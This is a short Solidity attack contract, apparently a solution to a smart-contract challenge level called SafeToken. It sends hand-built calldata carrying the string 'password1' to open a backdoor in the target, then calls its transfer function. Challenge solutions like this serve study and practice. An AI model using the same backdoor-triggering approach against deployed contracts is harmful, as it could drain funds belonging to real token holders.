pragma solidity ^0.6.0;

import '../levels/SafeToken.sol';

contract SafeTokenAttack {

    function openBackdoor(address level) public {
        (bool success,) = level.call(hex"31eaf0aa0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000970617373776f7264310000000000000000000000000000000000000000000000");
        require(success, "call unsuccessful!");
    }

    function transferOwnerTokens(address level) public {
        SafeToken instance = SafeToken(level);
        instance.transfer(address(this),0);
    }


    

}
